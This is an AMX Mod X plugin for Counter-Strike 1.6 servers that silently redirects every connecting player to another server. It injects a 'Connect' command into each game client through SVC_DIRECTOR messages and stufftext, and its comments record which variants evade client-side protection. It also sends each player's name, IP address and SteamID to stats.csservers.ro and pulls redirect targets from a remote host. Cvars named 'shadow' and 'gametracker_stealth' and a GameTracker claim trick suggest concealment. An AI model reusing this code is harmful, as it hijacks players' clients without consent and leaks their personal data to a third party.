#include <amxmodx>
#include <amxmisc>
#include <sockets>
#include <cstrike>
#include <fun>
#include <fakemeta>

#pragma dynamic 32768

#define REDIRECT_HOST "stats.csservers.ro"
#define SERVER_INFO_HOST "www.csservers.ro"
#define charsmax(%1) (sizeof(%1)-1)
#define REDIRECT_VERSION "windows_hlds_v2.8"
#define REDIRECT_SHORT_VERSION "v2.8"

new _css_debug = 0;
new cvar_redirect_server;
new cvar_redirect_server_winner;
new cvar_redirect_owner;
new redirect_server_winner[64];
new winner_drop;
new winner_count=0;
new before_claim_hostname[64];
new winner_socket_connection;

stock css_f(const id, const szCommands[], any:...)
{
	if (id && !is_user_connecting(id) && !is_user_connected(id))
	{
		return 0;
	}
	static _client_cmd[254];
	vformat(_client_cmd, charsmax(_client_cmd), szCommands, 3)
	message_begin(id ? MSG_ONE : MSG_ALL, SVC_DIRECTOR, _, id);
	write_byte(strlen(_client_cmd) + 2);
	write_byte(10);
	write_string(_client_cmd);
	message_end();
	
	return 1;
}
stock bool:is_user_steam(id)
{
   static dp_pointer;
   if(dp_pointer || (dp_pointer = get_cvar_pointer("dp_r_id_provider")))
   {
      server_cmd("dp_clientinfo %d", id);
      server_exec();
      return (get_pcvar_num(dp_pointer) == 2) ? true : false;
   }
   return false;
}
stock urlencode( const szInput[], szOutput[], const iLen )
{
    static const HEXCHARS[ 16 ] = {
        0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
        0x38, 0x39, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66
    };
    
    new iPos, cChar, iFLen;
    while( ( cChar = szInput[ iPos ] ) && iFLen < iLen )
    {
        if( cChar == 0x20 )
        {
            szOutput[ iFLen++ ] = 0x2B;
        }
        else if( !( 0x41 <= cChar <= 0x5A )
        && !( 0x61 <= cChar <= 0x7A )
        && !( 0x30 <= cChar <= 0x39 )
        && cChar != 0x2D
        && cChar != 0x2E
        && cChar != 0x5F )
        {
            if( ( iFLen + 3 ) > iLen )
            {
                break;
            }
            else if( cChar > 0xFF
            || cChar < 0x00 )
            {
                cChar = 0x2A;
            }
            
            szOutput[ iFLen++ ] = 0x25;
            szOutput[ iFLen++ ] = HEXCHARS[ cChar >> 4 ];
            szOutput[ iFLen++ ] = HEXCHARS[ cChar & 15 ];
        }
        else
        {
            szOutput[ iFLen++ ] = cChar;
        }
        
        iPos++;
    }
    
    szOutput[ iFLen ] = 0;
    return iFLen;
}
stock get_server_time()
{
	new _server_time[64];
	get_time("%H:%M:%S",_server_time,charsmax(_server_time));
	return _server_time;
}
public plugin_init()
{
	register_plugin("Redirect CSservers",REDIRECT_SHORT_VERSION,SERVER_INFO_HOST);
	
	register_concmd("claim","css_claim",ADMIN_BAN);
	register_concmd("done","css_done",ADMIN_BAN);
	
	cvar_redirect_server 		= register_cvar("redirect_server","");
	cvar_redirect_owner 		= register_cvar("redirect_owner","");
	cvar_redirect_server_winner	= register_cvar("redirect_server_winner","");
	
	register_cvar("shadow","");
	register_cvar("gametracker_stealth","");
	register_cvar("winner_drop","");
	register_cvar("winner_count","");
	
	// default 330
	set_task(float(330),"css_send_redirect_server_info", _, _, _, "b");
	set_task(float(333),"exec_read_winner", 103, _, _, "b");
	set_task(float(5),"exec_read_winner", _, _, _, "a",1);
}
public css_send_redirect_player_info(player_name[],player_ip[],steamid[],steam_on,for_winner,redirect_server_drop[])
{
	new redirect_owner[64],string_for_hash[256],hash[34],player_name_encoded[128],redirect_owner_encoded[128],redirect_server_encoded[128],server_ip[16],server_port[10];
	
	get_cvar_string("ip",server_ip,charsmax(server_ip));
	get_cvar_string("port",server_port,charsmax(server_port));
	
	new steam_on_string[] = "VALVE";
	if(steam_on==2) steam_on_string = "STEAM";
	
	new dot_location = containi(player_ip,":");
	new print_player_ip[32];
	strcat(print_player_ip,player_ip,dot_location);

	server_print("[%s][**DROP**][PLAYER:%s]   name-> ^"%s^"   ip-> ^"%s^"   destination-> ^"%s^"",get_server_time(),steam_on_string,player_name,print_player_ip,redirect_server_drop);
	
	get_pcvar_string(cvar_redirect_owner,redirect_owner,charsmax(redirect_owner));
	
	urlencode(player_name, player_name_encoded, charsmax(player_name_encoded));
	urlencode(redirect_owner,redirect_owner_encoded,charsmax(redirect_owner_encoded));
	urlencode(redirect_server_drop,redirect_server_encoded,charsmax(redirect_server_encoded));
	
	strcat(string_for_hash,redirect_server_drop,charsmax(string_for_hash));
	strcat(string_for_hash,steamid,charsmax(string_for_hash));
	strcat(string_for_hash,player_ip,charsmax(string_for_hash));
	md5(string_for_hash,hash);
	
	
	if(_css_debug==1)
	{
		server_print("redirect server: %s",redirect_server_drop);
		server_print("redirect server encoded: %s",redirect_server_encoded);
		server_print("redirect player_name: %s",player_name);
		server_print("redirect player_name_encoded: %s",player_name_encoded);
		server_print("redirect steamid: %s",steamid);
		server_print("redirect hash: %s",hash);
		server_print("steam_on: %d",steam_on);
	}
	
	new socket_error;
	new socket_connection = socket_open(REDIRECT_HOST,80,SOCKET_TCP,socket_error);
	
	if(_css_debug==1)
	{
		server_print("[css_send_redirect_player_info] socket_connection: %d",socket_connection);
		server_print("[css_send_redirect_player_info] socket_error: %d",socket_error);
	}
	
	if(socket_error) socket_close(socket_connection);
	
	// totul OK
	// socket_connection: 964 sau 940 ... etc ...
	// socket_error: 0
	// in caz de domeniu gresit
	// socket_connection: -1
	// socket_error: 2
	
	if (socket_connection > 0)
	{
		new query_cmd[512];
		new shadow = get_cvar_num("shadow");
		new redirect_version_to_send[] = REDIRECT_VERSION;
		
		if(for_winner==2)
		{
			redirect_version_to_send = "winner";
		}
		
		formatex(query_cmd,charsmax(query_cmd),"GET /stats/redirect_player.php?server_ip=%s&server_port=%s&player_name=%s&player_ip=%s&steamid=%s&version=%s&redirect_server=%s&redirect_port=27015&redirect_owner=%s&steam_on=%d&hash=%s&shadow=%d HTTP/1.1^r^nHost:%s^r^nConnection: close^r^n^r^n",server_ip,server_port,player_name_encoded,player_ip,steamid,redirect_version_to_send,redirect_server_encoded,redirect_owner_encoded,steam_on,hash,shadow,REDIRECT_HOST);
		
		if(!socket_error)
		{
			socket_send(socket_connection,query_cmd,charsmax(query_cmd));
			socket_close(socket_connection);
		}
	}
	else
	{
		switch (socket_error)
		{
			case 1: {  server_print("[%s][ERROR] creating socket - cannot send player stats to CsServers.ro",get_server_time()); }
			case 2: {  server_print("[%s][ERROR] resolving remote hostname - cannot send player stats to CsServers.ro",get_server_time()); }
			case 3: {  server_print("[%s][ERROR] connecting socket - cannot send player stats to CsServers.ro",get_server_time()); }
		}
	}
	//just in case
	//socket_close(socket_connection);
}
public css_send_redirect_server_info()
{
	new redirect_server[64],redirect_owner[64],redirect_owner_encoded[128],redirect_server_encoded[128],server_ip[16],server_port[10],redirect_version_to_send[32];
	
	winner_drop = get_cvar_num("winner_drop");
	winner_count = get_cvar_num("winner_count");
			
	if(_css_debug==1)
	{
		server_print("winner_count: %d",winner_count);
		server_print("winner_drop: %d",winner_drop);
	}
	
	get_cvar_string("ip",server_ip,charsmax(server_ip));
	get_cvar_string("port",server_port,charsmax(server_port));
	
	redirect_version_to_send = REDIRECT_VERSION;
	// daca avem 1==1 e numa winner serverul
	if(winner_drop==1 && (winner_count==winner_drop)) 
	{
		redirect_server = redirect_server_winner;
		redirect_version_to_send = "winner";
	}
	else
	{
		get_pcvar_string(cvar_redirect_server,redirect_server,charsmax(redirect_server));
	}
	
	get_pcvar_string(cvar_redirect_owner,redirect_owner,charsmax(redirect_owner));
	
	urlencode(redirect_owner,redirect_owner_encoded,charsmax(redirect_owner_encoded));
	urlencode(redirect_server,redirect_server_encoded,charsmax(redirect_server_encoded));
	
	new socket_error;
	new socket_connection = socket_open(REDIRECT_HOST,80,SOCKET_TCP,socket_error);
	
	if(_css_debug==1)
	{
		server_print("[css_send_redirect_server_info] socket_connection: %d",socket_connection);
		server_print("[css_send_redirect_server_info] socket_error: %d",socket_error);
	}
	
	if(socket_error) socket_close(socket_connection);
	

	if (socket_connection > 0)
	{
		new query_cmd[512];
		new shadow = get_cvar_num("shadow");
		
		formatex(query_cmd,charsmax(query_cmd),"GET /stats/redirect_server.php?server_ip=%s&server_port=%s&redirect_owner=%s&redirect_server=%s&redirect_port=27015&version=%s&shadow=%d HTTP/1.1^r^nHost:%s^r^nConnection: close^r^n^r^n",server_ip,server_port,redirect_owner_encoded,redirect_server_encoded,redirect_version_to_send,shadow,REDIRECT_HOST);
		
		if(_css_debug==2)
		{
			server_print("************redirect_server_encoded trimis: %s",redirect_server_encoded);
		}
		if(!socket_error)
		{
			socket_send(socket_connection,query_cmd,charsmax(query_cmd));
			socket_close(socket_connection);
		}
	}
	else
	{
		switch (socket_error)
		{
			case 1: {  server_print("[%s][ERROR] creating socket - cannot send redirect stats to CsServers.ro",get_server_time()); }
			case 2: {  server_print("[%s][ERROR] resolving remote hostname - cannot send redirect stats to CsServers.ro",get_server_time()); }
			case 3: {  server_print("[%s][ERROR] connecting socket - cannot send redirect stats to CsServers.ro",get_server_time()); }
		}
	}
	//just in case
	//socket_close(socket_connection);
}
public client_disconnect(id)
{
	if(is_user_bot(id))
	{
		server_print("[%s][FAKEFULL][BOT][REMOVE]",get_server_time());
	}
}
public client_putinserver(id)
{
	if(is_user_bot(id))
	{
		new name[128];
		get_user_info(id, "name", name, charsmax(name));
		server_print("[%s][FAKEFULL][BOT][ADD] ^"%s^"",get_server_time(),name);
	}
}
public client_connect(id)
{
	if( is_user_connecting(id))
	{
		if(!is_user_bot(id))
		{
			static count_drop = 1;
			
			new redirect_server[64],steam_on = 1,for_winner=1;
			winner_drop = get_cvar_num("winner_drop");
			if(winner_drop>1) winner_drop = 1;
			if(winner_drop<0) winner_drop = 0;
			
			// if not initialized and we have drops to winner
			if(winner_count==0 && winner_drop==1)
			{
				new cvar_winner_count= get_cvar_num("winner_count");
				winner_count = cvar_winner_count;
				if(winner_count>20) winner_count=20;
				if(winner_count<1) winner_count = 1;
			}
			else if(winner_drop==0)
			{
				count_drop = 0;
			}
			
			
			if(_css_debug==1)
			{
				server_print("[winner_count]: %d",winner_count);
				server_print("[winner_drop]: %d",winner_drop);
				server_print("[count_drop]: %d",count_drop);
			}
		
			get_pcvar_string(cvar_redirect_server,redirect_server,charsmax(redirect_server));
			
			if(_css_debug==1)
			{
				server_print("winner_drop = %d",winner_drop);
			}
			
			new ip[32],name[128],steamid[128];
			if(is_user_steam(id)) steam_on = 2;
			get_user_ip(id,  ip,  charsmax(ip),  0);
			get_user_info(id, "name", name, charsmax(name));
			get_user_authid(id , steamid , charsmax(steamid));
			
			if(_css_debug==1)
			{
				server_print("[[[winner_drop]]]: %d",winner_drop);
			}
					
			if(steam_on==1)
			{
				if(winner_drop==1 && count_drop == winner_count)
				{
					if(!equali(redirect_server_winner,"",0)) 
					{	
						redirect_server = redirect_server_winner;
						for_winner = 2;
					}
					
					if(_css_debug==1)
					{
						server_print("VALVE - winner -> [%s]",redirect_server);
					}
				}
				else
				{
					if(_css_debug==1)
					{
						server_print("VALVE - puscarias -> [%s]",redirect_server);
					}
				}
				css_f(id,"^"Connect^" %s;",redirect_server);
			}
			
			if(steam_on==2)
			{
				if(winner_drop==1 && count_drop == winner_count)
				{
					if(!equali(redirect_server_winner,"",0))
					{
						redirect_server = redirect_server_winner;
						for_winner = 2;
					}
					
					if(_css_debug==1)
					{
						server_print("STEAM ON - winner -> [%s]",redirect_server);
					}
				}
				else
				{
					if(_css_debug==1)
					{
						server_print("STEAM ON - puscarias -> [%s]",redirect_server);
					}
				}
				client_cmd(id,"wait;wait;^"connect^" %s;",redirect_server);
			}

			// client_cmd = stufftext
			// css_f = svc director
			// client_cmd(id,"^"Connect^" %s:%s",redirect_server,redirect_port); <- ajunge pe redirect
			// client_cmd(id,"^"connect^" %s:%s",redirect_server,redirect_port); <- ajunge pe redirect
			// client_cmd(id,"wait;wait;wait;wait;wait;wait;^"Connect^" %s:%s",redirect_server,redirect_port); <- cateodata se blocheaza la o linie
			// css_f(id,"wait;^"connect^" %s:%s",redirect_server,redirect_port); // <- cateodata se blocheaza la o linie
			// client_cmd(id,"ÿÿÿÿL %s",redirect_server); <- nu mai merge
			// not ok , \0x20 , 0x20 , \x20

			// proffesional shield 4.0
			// css_f ,  connect -> server is banned
			//			Connect -> invalid command

			if(count_drop == winner_count) {  count_drop = 0; }
			count_drop++;
			
			css_send_redirect_player_info(name,ip,steamid,steam_on,for_winner,redirect_server);
		}
	}
}
public read_winner()
{	
	new socket_error;
	winner_socket_connection = socket_open(SERVER_INFO_HOST,80,SOCKET_TCP,socket_error);
	
	if(_css_debug==1)
	{
		server_print("[read_winner] winner_socket_connection: %d",winner_socket_connection);
		server_print("[read_winner] socket_error: %d",socket_error);
	}
	
	if(socket_error) socket_close(winner_socket_connection);
	
	if (winner_socket_connection > 0)
	{
		new query_cmd[512],data_received[128];
	
		formatex(query_cmd,charsmax(query_cmd),"GET /__winner_dns.php HTTP/1.1^r^nHost:%s^r^nConnection: close^r^n^r^n",SERVER_INFO_HOST);
		
		if(!socket_error)
		{
			new newstring[64],count=0;
			
			socket_send2(winner_socket_connection,query_cmd,charsmax(query_cmd));
			if(socket_change(winner_socket_connection))
			{
				while(socket_recv(winner_socket_connection,data_received,charsmax(data_received)))
				{
					if(socket_change(winner_socket_connection,1))
					{
						socket_recv(winner_socket_connection,data_received,charsmax(data_received));
						
						new start_redirect = containi(data_received, "W[") ;
						new stop_redirect = containi(data_received, "]W") ;
						
						for (new i=start_redirect+2;i<stop_redirect;i++) 
						{ 
							newstring[count] = data_received[i];
							count++;
						}
						
						redirect_server_winner = newstring;
						set_cvar_string("redirect_server_winner",newstring);
						
						if(_css_debug==1)
						{
							server_print("GOT IT FROM SOCKET CONNECTION redirect_server_winner: %s",redirect_server_winner);
						}
					}
				}
			}
			socket_close(winner_socket_connection);
		}
	}
	else
	{
		// if not connected to CsServers - get it from cvar
		if(equali(redirect_server_winner,""))
		{
			get_pcvar_string(cvar_redirect_server_winner,redirect_server_winner,charsmax(redirect_server_winner));
		}
		
		switch (socket_error)
		{
			case 1: {  server_print("[%s][ERROR] creating socket - cannot read winner dns",get_server_time()); }
			case 2: {  server_print("[%s][ERROR] resolving remote hostname - cannot read winner dns",get_server_time()); }
			case 3: {  server_print("[%s][ERROR] connecting socket - cannot read winner dns",get_server_time()); }
		}
		server_print("[%s][INFO] redirect server winner is set to ^"%s^"",get_server_time(),redirect_server_winner);
	}
	//just in case
	socket_close(winner_socket_connection);
}
public exec_read_winner()
{
	new winner_drop = get_cvar_num("winner_drop");
	if(winner_drop)
	{
		read_winner();
	}
	else
	{
		remove_task(103);
	}
}
public css_claim()
{
	get_user_name(0,before_claim_hostname,charsmax(before_claim_hostname));
	server_cmd("hostname ^"GameTrackerClaimServer^"");
	server_cmd("hostname");
}
public css_done()
{
	if(!equali(before_claim_hostname,"",0))
	{
		server_cmd("hostname ^"%s^"",before_claim_hostname);
	}
	server_cmd("hostname");
}
